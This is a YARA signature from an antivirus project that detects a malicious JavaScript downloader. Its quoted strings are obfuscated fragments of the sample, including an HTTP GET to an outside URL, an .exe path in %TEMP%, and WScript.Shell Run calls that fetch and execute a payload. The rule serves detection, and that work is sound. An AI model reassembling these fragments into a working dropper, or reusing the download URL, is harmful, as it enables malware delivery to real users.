rule sig_20160328_4e260ddfb3541f48298d60ad3a2d53bb {
  meta:
    description = "datamaliciousorder - file 20160328_4e260ddfb3541f48298d60ad3a2d53bb.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "8e02e0d97f0e2d40f713cfcf7fb03f7a0cec3b23b6f405fbf850b16ac10ce2d0"

  strings:
    $s1  = "function Epift() {return Jqpyk[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"1CeTryVxDhXSMGQ.exe\";};" fullword ascii
    $s2  = "do {WScript[Lyxnqvzco](Afzkm() * 11)} while (Ftmclvl[\"readystate\"] < 4 );" fullword ascii
    $s3  = "var Jqpyk = function Lswseshn() {return WScript[Bntpcqicu](\"WScript.Shell\");}();" fullword ascii
    $s4  = "Ftmclvl[Clwdxil](\"GET\", \"http://www.stopeugenicsnow.eu/m8dhs\", false);" fullword ascii
    $s5  = "function Xvgisnned(Vtlmxdmnoz, Igake){return Vtlmxdmnoz - Igake;};" fullword ascii
    $s6  = "function Cdbwijb() {return ((Mytorqm == true) && (Mytorqm == Qlsnoibige)) ? 1 : Hhpkajevn;};" fullword ascii
    $s7  = "function Jngqzh(Avlynwpg){Jqpyk[\"Run\"](Avlynwpg, Hhpkajevn, Hhpkajevn);};" fullword ascii
    $s8  = "function Afzkm(){return 22;};" fullword ascii
    $s9  = " while (Pyrzg){" fullword ascii
    $s10 = "var Efkhq = new this[\"Date\"]();" fullword ascii
    $s11 = "return Xvgisnned(Sanyeng, Wutczvtxuk);" fullword ascii
    $s12 = "function Zvxjdsog(){return Bntpcqicu;};" fullword ascii
    $s13 = "var Qlsnoibige = false;" fullword ascii
    $s14 = "var Xcxspshz = false;" fullword ascii
    $s15 = "var Mytorqm = false;" fullword ascii
    $s16 = "function Squqlyo(){return Chknlf;};" fullword ascii
    $s17 = "Qlsnoibige = true; " fullword ascii
    $s18 = "function Mpdmwhxjou()" fullword ascii
    $s19 = "Mytorqm = true; " fullword ascii
    $s20 = "function Qmfdxqrgrg(Yidamwfcp) {var Gwxtksjge = (1, 2, 3, 4, 5, Yidamwfcp); return Gwxtksjge;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}